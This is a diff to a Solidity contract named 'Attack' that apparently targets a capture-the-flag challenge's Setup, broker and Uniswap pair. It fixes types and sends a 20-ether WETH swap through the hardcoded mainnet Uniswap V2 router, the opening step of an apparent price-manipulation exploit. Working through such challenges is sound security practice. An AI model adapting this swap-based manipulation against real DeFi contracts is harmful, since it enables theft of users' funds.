@@ -10,20 +10,21 @@ interface IUni {
         address[] calldata path,
         address to,
         uint deadline
-    ) externa returns (uint[] memory amounts);
+    ) external returns (uint[] memory amounts);
 }
 
 contract Attack {
-    IUni pair;
+    IUniswapV2Pair pair;
     Broker broker;
     Setup setup;
     Token token;
     WETH9 weth;
+    IUni router = IUni(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
 
     // Get all addresses
     constructor(address _setup) {
         setup = Setup(_setup);
-        pair = setup.pair();
+        pair = IUniswapV2Pair(setup.pair());
         broker = setup.broker();
         token = setup.token();
         weth = setup.weth();
@@ -40,7 +41,7 @@ contract Attack {
 
         weth.approve(address(pair), 20 ether);
 
-        pair.swapExactTokensForTokens(
+        router.swapExactTokensForTokens(
             20 ether,
             0,
             path,
